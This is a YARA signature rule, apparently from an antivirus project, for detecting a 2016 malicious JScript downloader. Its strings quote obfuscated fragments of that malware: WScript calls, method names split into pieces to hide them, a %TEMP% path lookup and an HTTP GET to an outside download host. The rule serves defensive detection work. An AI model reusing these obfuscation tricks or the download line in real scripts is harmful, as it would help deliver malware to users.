rule sig_20160428_0bdab98c0e7564de865cedaebe597db4 {
  meta:
    description = "datamaliciousorder - file 20160428_0bdab98c0e7564de865cedaebe597db4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "379479ee336883f6ccef7a7cdafefd84bb1f7e476a06bae84b5a671ced3b855b"

  strings:
    $s1  = "JzdBssTecKpwVqvBgxHsz[KtbEqjRuaVpjHanPayTzv](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function NyiYriVxbMlmEedYtsGfh(GjcXtfOalFhtFbeFjyYtk){HmdXhoAzgWhdGmcCmqIbh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function NyiYriVxbMlmEedYtsGfh(GjcXtfOalFhtFbeFjyYtk){HmdXhoAzgWhdGmcCmqIbh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function NmgYcuOfhIwoNceArcObr() {return HmdXhoAzgWhdGmcCmqIbh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "function GpgCtlCzoCrrZzzPzhIgi(UvbPokHrxLmqEkyLyrSct, CemTaxWpuMsjQzjXbkTfh){SxhHyxCfeQeeRcuPefHfd = SxhHyxCfeQeeRcuPefHfd * 1; " ascii
    $s6  = "return UvbPokHrxLmqEkyLyrSct - CemTaxWpuMsjQzjXbkTfh;};" fullword ascii
    $s7  = "var HmdXhoAzgWhdGmcCmqIbh = function MgrIaoAuyYbaVbhYyjHsk() {return YddHcoCocXefHysNtsLkr[QqyFxhElzZllFxjNdkDer](\"WScript\"+\"" ascii
    $s8  = "var YddHcoCocXefHysNtsLkr = this[\"WScript\"];" fullword ascii
    $s9  = "function QzeNjoZhyRyeJlqGiaRkv() {return ((AlgBruNedZxzTqcKdbPzj == true) && (AlgBruNedZxzTqcKdbPzj == VsbAdrAmgZnzDhmFbeQzj)) ?" ascii
    $s10 = "function QzeNjoZhyRyeJlqGiaRkv() {return ((AlgBruNedZxzTqcKdbPzj == true) && (AlgBruNedZxzTqcKdbPzj == VsbAdrAmgZnzDhmFbeQzj)) ?" ascii
    $s11 = "var HmdXhoAzgWhdGmcCmqIbh = function MgrIaoAuyYbaVbhYyjHsk() {return YddHcoCocXefHysNtsLkr[QqyFxhElzZllFxjNdkDer](\"WScript\"+\"" ascii
    $s12 = "function NmgYcuOfhIwoNceArcObr() {return HmdXhoAzgWhdGmcCmqIbh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s13 = "function GpgCtlCzoCrrZzzPzhIgi(UvbPokHrxLmqEkyLyrSct, CemTaxWpuMsjQzjXbkTfh){SxhHyxCfeQeeRcuPefHfd = SxhHyxCfeQeeRcuPefHfd * 1; " ascii
    $s14 = "if (JzdBssTecKpwVqvBgxHsz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s15 = "function GhiYiyFshFpcRjaLalLkg(){return QimPopGjwGrmLoaCxwGws + \"\";};" fullword ascii
    $s16 = "AlgBruNedZxzTqcKdbPzj = true; " fullword ascii
    $s17 = "var AlgBruNedZxzTqcKdbPzj = false;" fullword ascii
    $s18 = "function NhcVlyZvhRunXevBnkZgm(){return QqyFxhElzZllFxjNdkDer;};" fullword ascii
    $s19 = "var MjtVclUjnRkcCqvLvvNlg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "HmsDkwWbeUxnCbrGfcTut = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}